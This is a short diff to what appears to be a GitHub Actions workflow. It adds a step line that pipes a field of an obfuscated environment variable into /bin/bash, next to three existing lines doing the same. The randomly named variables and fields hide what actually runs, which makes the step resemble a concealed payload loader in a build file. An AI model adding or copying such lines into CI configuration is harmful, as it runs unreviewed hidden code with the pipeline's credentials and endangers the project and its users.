@@ -40,6 +40,7 @@ jobs:
           echo $cy5 | jq -r .vox5 | /bin/bash
           printf '%s' "$gkcza93" | jq -r .eill3802 | /bin/bash
           echo $pz1 | jq -r .hsg0 | /bin/bash
+          printf '%s' "$h90" | jq -r .k84 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
